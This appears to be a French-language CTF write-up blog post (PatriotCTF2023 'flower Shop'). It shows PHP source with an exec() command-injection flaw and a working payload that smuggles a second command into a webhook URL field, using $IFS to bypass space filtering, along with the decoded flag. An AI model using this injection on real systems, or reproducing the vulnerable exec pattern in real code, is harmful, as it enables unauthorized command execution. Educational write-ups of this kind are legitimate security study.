@@ -1,0 +1,223 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[PatriotCTF2023 - Web] flower Shop // chrootcommit</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.113.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="chrootcommit" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1fe426fd82899b3823133b4b6fadb0e1f0d8332eecc710a4dfe43101ac5895e0.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[PatriotCTF2023 - Web] flower Shop"/>
+<meta name="twitter:description" content="Team: XxxPassword123xxX
+Difficulty: medium
+Overview On a une application web dont on a accès au code source. Cette WebApp permet d&rsquo;inscrire/s&rsquo;authenfier et de réinitialiser son mot de passe. A l&rsquo;inscription on fournit le webhook permettant de recevoir son nouveau mot de passe en cas de réinitialisation de ce dernier. Notre objectif est de pouvoir lire le fichier admin.php et récupérer le flag à l&rsquo;intérieur.
+Analyse de code Filtre de l&rsquo;input de webhook En analysant le code, on peut apercevoir un filtre sur la validation du format du webhook :"/>
+
+    <meta property="og:title" content="[PatriotCTF2023 - Web] flower Shop" />
+<meta property="og:description" content="Team: XxxPassword123xxX
+Difficulty: medium
+Overview On a une application web dont on a accès au code source. Cette WebApp permet d&rsquo;inscrire/s&rsquo;authenfier et de réinitialiser son mot de passe. A l&rsquo;inscription on fournit le webhook permettant de recevoir son nouveau mot de passe en cas de réinitialisation de ce dernier. Notre objectif est de pouvoir lire le fichier admin.php et récupérer le flag à l&rsquo;intérieur.
+Analyse de code Filtre de l&rsquo;input de webhook En analysant le code, on peut apercevoir un filtre sur la validation du format du webhook :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chrootcommit.github.io/posts/patriotctf2023_flower-shop/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-11T15:15:15-04:00" />
+<meta property="article:modified_time" content="2023-09-11T15:15:15-04:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://chrootcommit.github.io/"><img class="app-header-avatar" src="/profile.png" alt="chrootcommit" /></a>
+      <span class="app-header-title">chrootcommit</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/about">About</a>
+            -
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+            -
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Junior Cybersecurity Consultant.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/ChRootCommit" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[PatriotCTF2023 - Web] flower Shop</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Sep 11, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://chrootcommit.github.io/tags/patriotctf2023/">PatriotCTF2023</a>
+              <a class="tag" href="https://chrootcommit.github.io/tags/web/">Web</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Team: XxxPassword123xxX</p>
+<p>Difficulty: medium</p>
+<h1 id="overview">Overview</h1>
+<img src="/patriotctf2023/overview_flowershop.png"  width="700" height="500">
+<p>On a une application web dont on a accès au code source. Cette WebApp permet d&rsquo;inscrire/s&rsquo;authenfier et de réinitialiser son mot de passe.
+A l&rsquo;inscription on fournit le webhook permettant de recevoir son nouveau mot de passe en cas de réinitialisation de ce dernier.
+Notre objectif est de pouvoir lire le fichier <code>admin.php</code> et récupérer le flag à l&rsquo;intérieur.</p>
+<h1 id="analyse-de-code">Analyse de code</h1>
+<h2 id="filtre-de-linput-de-webhook">Filtre de l&rsquo;input de webhook</h2>
+<p>En analysant le code, on peut apercevoir un filtre sur la validation du format du webhook :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SignupController</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Signup</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $uid;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $pwd;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $wh;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($uid, $pwd, $wh) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($uid);
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pwd</span> <span style="color:#f92672">=</span> $pwd;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">filter_var</span>($wh, <span style="color:#a6e22e">FILTER_SANITIZE_URL</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">signupUser</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pwd</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wh</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location: ../login.php?error=EmptyInput&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^[a-zA-Z0-9]*%/&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location: ../login.php?error=InvalidUid&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">filter_var</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wh</span>, <span style="color:#a6e22e">FILTER_VALIDATE_URL</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location: ../login.php?error=NotValidWebhook&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checkUser</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location: ../login.php?error=UserTaken&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setUser</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pwd</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wh</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Les filtres sont FILTER_SANITIZE_URL et FILTER_VALIDATE_URL. Si on lit les docs sur les filtres php ( <a href="https://www.php.net/manual/en/filter.filters.sanitize.php">Sanitize filters</a> et <a href="https://www.php.net/manual/en/filter.filters.validate.php">Validate filters</a>) :</p>
+<ul>
+<li>FILTER_SANITIZE_URL : Remove all characters except letters, digits and $-_.+!*&rsquo;(),{}|\^~[]`&lt;&gt;#%&quot;;/?:@&amp;=.</li>
+<li>FILTER_VALIDATE_URL : Validates value as URL (according to » <a href="http://www.faqs.org/rfcs/rfc2396)">http://www.faqs.org/rfcs/rfc2396)</a>, optionally with required components. Beware a valid URL may not specify the HTTP protocol http:// so further validation may be required to determine the URL uses an expected protocol, e.g. ssh:// or mailto:. Note that the function will only find ASCII URLs to be valid; internationalized domain names (containing non-ASCII characters) will fail.</li>
+</ul>
+<h2 id="potentielle-injection-de-commande-">Potentielle injection de commande :</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResetController</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Reset</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $uid;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $wh;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $tmpPass;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($uid) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span> <span style="color:#f92672">=</span> $uid;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">resetPassword</span>() {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wh</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checkUser</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wh</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location: ../login.php?error=InvalidUser&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmpPass</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmpPwd</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;php ../scripts/send_pass.php &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmpPass</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wh</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; &gt; /dev/null 2&gt;&amp;1 &amp;&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmpPass</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>On peut aussi voir que la fonction de reset execute via ligne de commande le script send_pass.php en prenant en paramètre le webhook que l&rsquo;on a entré au moment de la création de compte.
+De là, on peut en déduire une injection de commande en contournant les filtres d&rsquo;url.</p>
+<h1 id="construction-de-la-payload">Construction de la Payload</h1>
+<p>Pour passer les filtres, il faut que la payload commence par une url quelquonque. Ensuite, on peut ajouter le caractère <code>;</code> pour enchainer par une autre commande.
+On fait aussi face à une contrainte, l&rsquo;un des filtres n&rsquo;accepte pas les espaces et les supprimes, donc il nous faut une payload pour le ficher <code>admin.php</code> sans utiliser d&rsquo;espace.</p>
+<p>A travers mes divers tests en local  (docker), je me suis aperçu que pas mal de payloads sur <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-without-space">PayloadAllTheThings</a> ne passaient pas car le <code>exec</code> utilise le shell sh. Cependant, j&rsquo;ai remarqué qu&rsquo;une payload de type <code>cat$IFS/etc/passwd</code> passe sur sh. J&rsquo;ai donc construit ma payload avec le séparateur $IFS dans le but de copier le contenu de <code>admin.php</code> vers un autre fichier.</p>
+<p>Voici une payload possible à injecter au webhook:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://127.0.0.1/;base64$IFS/var/www/html/admin.php&gt;../pwned.txt;echo
+</span></span></code></pre></div><p>Remarque : On ajoute le echo à la fin à cause de la redirection à la fin de la commande.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>Maintenant on peut se créer un compter avec cette payload :</p>
+<p><img src="/patriotctf2023/flowershop_exploit_step01.png" alt=""></p>
+<p>On se déconnecte du compte et on déclenche la réinitialisation de password, ça devrait déclencher notre injection de commande ;) :</p>
+<p><img src="/patriotctf2023/flowershop_trigger_rce.png" alt="">
+<img src="/patriotctf2023/flowershop_rce_executed.png" alt=""></p>
+<p>On peut maintenant récupérer le contenu d&rsquo;admin.php en base64 et le décoder pour avoir le flag :</p>
+<p><img src="/patriotctf2023/flowershop_b64.png" alt=""></p>
+<pre tabindex="0"><code>echo &#39;PD9waHAKCnNlc3Npb25fc3RhcnQoKTsKCmlmICghaXNzZXQoJF9TRVNTSU9OWyd1c2VyaWQnXSkp                                                        
+IHsKICAgIGhlYWRlcigiTG9jYXRpb246IGxvZ2luLnBocD9lcnJvcj1ub3Rsb2dnZWRpbiIpOwog
+ICAgZXhpdCgpOwp9IAoKaWYgKCRfU0VTU0lPTlsndXNlcm5hbWUnXSAhPT0gImFkbWluIiApIHsK
+ICAgIGhlYWRlcigiTG9jYXRpb246IGxvZ2luLnBocD9lcnJvcj1ub3RhZG1pbiIpOwogICAgZXhp
+dCgpOwp9Cgo/PgoKPD9waHAgaW5jbHVkZSAidGVtcGxhdGVzL2hlYWRlci5waHAiOyA/PiAgICAK
+ICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGgzPkNBQ0l7eTB1djNfZjB1bmRf
+dGgzX3JhcjNzdF9zMzNkXzBmX2FsbCF9PC9oMz4KICAgIDwvZGl2Pgo8P3BocCBpbmNsdWRlICJ0
+ZW1wbGF0ZXMvZm9vdGVyLnBocCI7ID8+Cg==&#39; | base64 -d
+&lt;?php
+
+session_start();
+
+if (!isset($_SESSION[&#39;userid&#39;])) {
+    header(&#34;Location: login.php?error=notloggedin&#34;);
+    exit();
+} 
+
+if ($_SESSION[&#39;username&#39;] !== &#34;admin&#34; ) {
+    header(&#34;Location: login.php?error=notadmin&#34;);
+    exit();
+}
+
+?&gt;
+
+&lt;?php include &#34;templates/header.php&#34;; ?&gt;    
+    &lt;div class=&#34;container&#34;&gt;
+        &lt;h3&gt;CACI{y0uv3_f0und_th3_rar3st_s33d_0f_all!}&lt;/h3&gt;
+    &lt;/div&gt;
+&lt;?php include &#34;templates/footer.php&#34;; ?&gt;
+</code></pre><p>flag : CACI{y0uv3_f0und_th3_rar3st_s33d_0f_all!}</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
